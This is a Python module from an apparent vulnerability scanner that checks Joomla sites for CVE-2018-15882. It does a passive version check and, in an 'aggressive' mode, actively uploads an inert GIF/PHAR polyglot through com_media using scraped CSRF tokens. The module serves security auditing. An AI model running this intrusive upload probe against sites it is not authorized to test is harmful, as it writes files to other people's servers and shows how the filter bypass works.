from __future__ import annotations

import re
from typing import Any

from ...core.http import HttpSession, normalize_url
from ...core.probes import rand_str
from ...core.versions import parse_version_safe
from .advisory import passive_core_finding

CVE_ID = "CVE-2018-15882"
NAME = "Joomla InputFilter PHAR upload bypass"
AFFECTED_RULE = "Joomla before 3.8.12"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    return "LIKELY_VULNERABLE" if parsed < parse_version_safe("3.8.12") else "PATCHED"


def passive_check(joomla_version: str | None):
    finding = passive_core_finding(
        cve=CVE_ID,
        name=NAME,
        affected_rule=AFFECTED_RULE,
        joomla_version=joomla_version,
        classify=classify_version,
        remediation="Upgrade Joomla to 3.8.12 or a currently supported release and inspect uploaded files.",
    )
    finding.exploit_available = True
    return finding


def _csrf_token(body: str) -> str | None:
    patterns = (
        r'<input[^>]+name=["\']([a-f0-9]{32})["\'][^>]+value=["\']1["\']',
        r'["\']csrf\.token["\']\s*:\s*["\']([a-f0-9]{32})["\']',
    )
    for pattern in patterns:
        match = re.search(pattern, body, re.IGNORECASE)
        if match:
            return match.group(1)
    return None


def build_inert_phar_stub(marker: str) -> bytes:
    """Build a non-executing image/polyglot that exercises the missing PHAR-stub filter."""
    return f"GIF89a\n{marker}\n<? __HALT_COMPILER(); ?>\n".encode()


def probe_upload(target_url: str, timeout: int = 12, proxy: str | None = None) -> dict[str, Any]:
    base = normalize_url(target_url)
    session = HttpSession(base_url=base, timeout=timeout, proxy=proxy)
    marker = f"PROOFCMS_PHAR_{rand_str(12)}"
    filename = f"proofcms-{rand_str(8)}.gif"
    payload = build_inert_phar_stub(marker)
    attempts: list[str] = []

    pages = (
        "/index.php?option=com_media&view=images&tmpl=component",
        "/administrator/index.php?option=com_media&view=images&tmpl=component",
        "/",
    )
    candidates: list[tuple[str, str | None]] = []
    for page in pages:
        response = session.get(page)
        candidates.append((page, _csrf_token(response.get("body", ""))))

    endpoints = (
        "/index.php?option=com_media&task=file.upload&tmpl=component",
        "/administrator/index.php?option=com_media&task=file.upload&tmpl=component",
    )
    for source, token in candidates:
        fields: dict[str, str] = {"folder": "images"}
        if token:
            fields[token] = "1"
        for endpoint in endpoints:
            upload = session.post(
                endpoint,
                fields=fields,
                files={"Filedata": (filename, payload, "image/gif")},
            )
            proof_url = f"{base}/images/{filename}"
            proof = session.get(proof_url)
            attempts.append(
                f"token_source={source},token={'yes' if token else 'no'},"
                f"upload={upload.get('status', 0)},proof={proof.get('status', 0)}"
            )
            if proof.get("status") == 200 and marker in proof.get("body", ""):
                return {
                    "accepted": True,
                    "proof_url": proof_url,
                    "uploaded_filename": f"images/{filename}",
                    "attempts": attempts,
                }

    return {"accepted": False, "attempts": attempts}


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    **kwargs: Any,
):
    finding = passive_check(joomla_version)
    if not run_exploit_check or finding.status != "LIKELY_VULNERABLE":
        return finding
    if exploit_mode != "aggressive":
        finding.detail += " Active verification writes an inert file and is available only in aggressive lab mode."
        return finding

    proof = probe_upload(target_url, timeout=timeout, proxy=proxy)
    finding.exploit_ran = True
    if proof.get("accepted"):
        finding.status = "VULNERABLE_UPLOAD_ONLY"
        finding.confidence = "CONFIRMED"
        finding.proof_url = proof["proof_url"]
        finding.uploaded_filename = proof["uploaded_filename"]
        finding.detail = (
            "Legacy com_media accepted and served a GIF file containing an inert PHAR stub marker. "
            "No executable PHP or command was included."
        )
        finding.action = (
            f"Upgrade Joomla to 3.8.12 or newer and delete {proof['uploaded_filename']} from the lab."
        )
    else:
        finding.status = "NOT_CONFIRMED"
        finding.confidence = "MEDIUM"
        finding.detail = (
            "The prepared inert PHAR-stub upload was not publicly retrievable. The affected InputFilter may still "
            "be present, but this installation did not expose a usable legacy media upload surface. Attempts: "
            + "; ".join(proof.get("attempts", []))
        )
    return finding


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": "Joomla core",
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": ["<3.8.12"],
        "exploit_available": True,
        "exploit_modes": ["aggressive"],
        "intrusive": True,
        "module_version": "1.1.0",
        "last_reviewed": "2026-10-02",
        "updated": "2026-10-02",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2018-15882",
            "https://developer.joomla.org/security-centre/743-20180801-core-hardening-the-inputfilter-for-phar-stubs.html",
        ],
    }
